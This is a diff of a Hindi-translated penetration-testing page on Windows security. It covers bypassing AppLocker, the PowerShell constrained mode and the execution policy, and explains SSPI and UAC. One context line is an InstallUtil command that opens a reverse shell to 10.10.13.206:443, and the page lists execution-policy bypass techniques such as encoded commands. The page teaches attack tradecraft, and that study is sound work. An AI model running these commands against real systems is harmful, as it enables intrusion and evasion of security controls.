@@ -229,11 +230,11 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग किसी भी प्रक्रिया में **Powershell कोड निष्पादित करने के लिए** कर सकते हैं और constrained mode को बायपास कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
+आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग किसी भी process में **execute Powershell** code करने और constrained mode को bypass करने के लिए कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
 
-## PS निष्पादन नीति
+## PS Execution नीति
 
-डिफ़ॉल्ट रूप से यह **restricted.** पर सेट होता है। इस नीति को बायपास करने के मुख्य तरीके:
+डिफ़ॉल्ट रूप से यह **restricted.** पर सेट होता है। इस नीति को bypass करने के मुख्य तरीके:
 ```bash
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -253,32 +254,32 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
-More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+More can be found [यहाँ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
 ## Security Support Provider Interface (SSPI)
 
-यह API है जिसे उपयोगकर्ताओं को प्रमाणित करने के लिए उपयोग किया जा सकता है।
+यह API है जिसे users को authenticate करने के लिए उपयोग किया जा सकता है।
 
-SSPI दो मशीनों के बीच संचार के लिए उपयुक्त प्रोटोकॉल खोजने के लिए जिम्मेदार होता है। इसकी पसंदीदा विधि Kerberos है। फिर SSPI यह नेगोशिएट करेगा कि कौन सा प्रमाणन प्रोटोकॉल उपयोग किया जाएगा; इन प्रमाणन प्रोटोकॉल्स को Security Support Provider (SSP) कहा जाता है, ये हर Windows मशीन में DLL के रूप में मौजूद होते हैं और दोनों मशीनों के एक ही SSP का समर्थन करने पर ही वे संवाद कर सकते हैं।
+SSPI उन दोनों मशीनों के लिए उपयुक्त प्रोटोकॉल खोजने के लिए जिम्मेदार होगा जो संवाद करना चाहती हैं। इस के लिए पसंदीदा विधि Kerberos है। फिर SSPI यह बातचीत करेगा कि कौन सा authentication protocol उपयोग किया जाएगा, इन authentication protocols को Security Support Provider (SSP) कहा जाता है, ये प्रत्येक Windows मशीन के अंदर DLL के रूप में स्थित होते हैं और दोनों मशीनों को संवाद करने में सक्षम होने के लिए एक ही का समर्थन करना चाहिए।
 
-### Main SSPs
+### मुख्य SSPs
 
-- **Kerberos**: पसंदीदा
+- **Kerberos**: पसंदीदा तरीका
 - %windir%\Windows\System32\kerberos.dll
-- **NTLMv1** and **NTLMv2**: संगतता कारणों से
+- **NTLMv1** और **NTLMv2**: Compatibility कारणों से
 - %windir%\Windows\System32\msv1_0.dll
-- **Digest**: Web servers और LDAP के लिए, पासवर्ड MD5 hash के रूप में
+- **Digest**: Web servers और LDAP के लिए, password MD5 hash के रूप में
 - %windir%\Windows\System32\Wdigest.dll
-- **Schannel**: SSL और TLS
+- **Schannel**: SSL और TLS के लिए
 - %windir%\Windows\System32\Schannel.dll
-- **Negotiate**: इसका उपयोग उपयोग होने वाले प्रोटोकॉल (Kerberos या NTLM — जहाँ Kerberos डिफ़ॉल्ट है) को नेगोशिएट करने के लिए किया जाता है।
+- **Negotiate**: यह उपयोग किए जाने वाले प्रोटोकॉल (Kerberos या NTLM, जहाँ Kerberos default है) को negotiate करने के लिए उपयोग होता है
 - %windir%\Windows\System32\lsasrv.dll
 
-#### The negotiation could offer several methods or only one.
+#### बातचीत कई तरीकों की पेशकश कर सकती है या केवल एक।
 
 ## UAC - User Account Control
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक फीचर है जो उच्च-प्राधिकार वाली गतिविधियों के लिए **सहमति प्रॉम्प्ट** सक्षम करता है।
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक feature है जो elevated गतिविधियों के लिए एक consent prompt सक्षम करता है।
 
 
 {{#ref}}
